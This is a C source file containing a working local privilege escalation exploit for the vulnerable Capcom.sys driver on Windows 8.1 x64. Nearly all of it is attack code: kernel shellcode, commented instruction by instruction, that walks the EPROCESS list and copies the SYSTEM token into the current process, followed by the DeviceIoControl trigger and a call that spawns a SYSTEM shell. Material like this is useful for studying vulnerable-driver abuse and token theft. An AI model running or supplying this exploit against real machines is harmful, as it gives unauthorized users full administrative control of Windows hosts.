// Exploit    : Capcom.sys Local Privilege Escalation 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 8.1 Enterprise (x64)
// Inspired by: OJ Reeves's "Hackingz Ze Komputerz" stream

#include <windows.h>
#include <stdio.h>

int main()
{
	//metasm > jne $ - 0x14
	//	"\x75\xea"
	//	metasm > jne $ - 0x1b
	//	"\x75\xe3"
	//	metasm > jnz $ - 0x1b
	//	"\x75\xe3"
	//	metasm > jnz $ - 0x19
	//	"\x75\xe5"

	//https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
	BYTE shellCode[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // shellcode pointer placeholder
	0x50,						    // push rax				; save the current context on the stack					
	0x53,						    // push rbx
	0x51,						    // push rcx
	0x48, 0x31, 0xC0,                                   // xor rax, rax                     ; zero out rax
	0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,     // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax [KPCR + 0x180(KPRCB) + 0x8(KTHREAD)]
	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,           // mov rax,QWORD PTR [rax+0xb8]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
	0x48, 0x89, 0xC3,				    // mov rbx, rax                     ; make copy of the current process's EPROCESS
	0x48, 0x8B, 0x9B, 0xE8, 0x02, 0x00, 0x00,	    // mov rbx,[rbx + 0x2e8]		; inside EPROCESS structure ActiveProcessLinks[0].Flink is at offset 0x2e8
	0x48, 0x81, 0xEB, 0xE8, 0x02, 0x00, 0x00,           // sub rbx, 0x2e8			; go to nextProcess
	0x48, 0x8B, 0x8B, 0xE0, 0x02, 0x00, 0x00,	    // mov rcx,[rbx + 0x2e0]		; extract UniqueProcessId at offset 0x2e0
	0x48, 0x83, 0xF9, 0x04,				    // cmp rcx, 4			; compare to target PID, that is 4 [SYSTEM PID]
	0x75, 0xE5,					    // jnz $-0x19			; if PID 4 not found, jump backwards 27 bytes
	// at this point rbx = system KPORCESS, rax = current KPROCESS
	0x48, 0x8B, 0x8B, 0x48, 0x03, 0x00, 0x00,	    // mov rcx, [rbx + 0x348]		; grab SYSTEM's process EPROCESS token at offset 0x348
	0x80, 0xE1, 0xF0,				    // and cl, 0xf0			; store RefCnt from token(EX_FAST_REF) struct
	0x48, 0x89, 0x88, 0x48, 0x03, 0x00, 0x00,	    // mov[rax + 0x348], rcx            ; replace current process token with the system token
	0x59,						    // pop rcx				; resore context of the stack										
	0x5B,						    // pop rbx
	0x58,						    // pop rax
	//0x48, 0x83, 0xC4, 0x28,			     // add rsp, 40
	//0x58, 0x58, 0x58, 0x58, 0x58,			     // pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)
	0x48, 0x31, 0xC0,                                   // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
	0xC3,                                               // ret
	};

	wchar_t* deviceName = L"\\\\.\\Htsysm72FB";
	const DWORD MagicIoctl = 0xaa013044;
	PBYTE inputBuffer;
	DWORD bytesReturned = 0;
	DWORD outputBuffer = 0;

	HANDLE capcomDriver = CreateFile(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (capcomDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create Capcom device driver with error: %u\n", GetLastError());
		return 1;
	}
	printf("[+] Capcom driver handle: 0x%p\n", capcomDriver);

	inputBuffer = VirtualAlloc(NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (inputBuffer == NULL) {
		printf("[!] Failed to allocate memory with error code: %u\n", GetLastError());
		return 1;
	}
	printf("[+] VirtualAlloc was successful!\n");
	
	memcpy(inputBuffer, shellCode, sizeof(shellCode));
	printf("[+] Shellcode has successfully been copied to input buffer!\n");

	*(PULONG_PTR)inputBuffer = (ULONG_PTR)(inputBuffer + 8);
	//*(PULONG_PTR)(inputBuffer+8) = 0x4141414141414141;
	ULONG_PTR evilBuffer = (ULONG_PTR)(inputBuffer + 8);

	BOOL ioResult = DeviceIoControl(capcomDriver, MagicIoctl, &evilBuffer, 8,
		&outputBuffer, 4, &bytesReturned, NULL);

	if (!ioResult) {
		printf("[!] Failed to interact with driver with error code: %u\n", GetLastError());
		return 1;
	}
	printf("[+] DeviceIoControl trigger succeeded!\n");

	// spawn new cmd.exe as NT AUTHORITY\SYSTEM
	printf("[+] Enjoy your new SYSTEM shell!\n");
	system("cmd.exe");

	// cleanup code
	if (capcomDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(capcomDriver);
	}

	return 0;
}
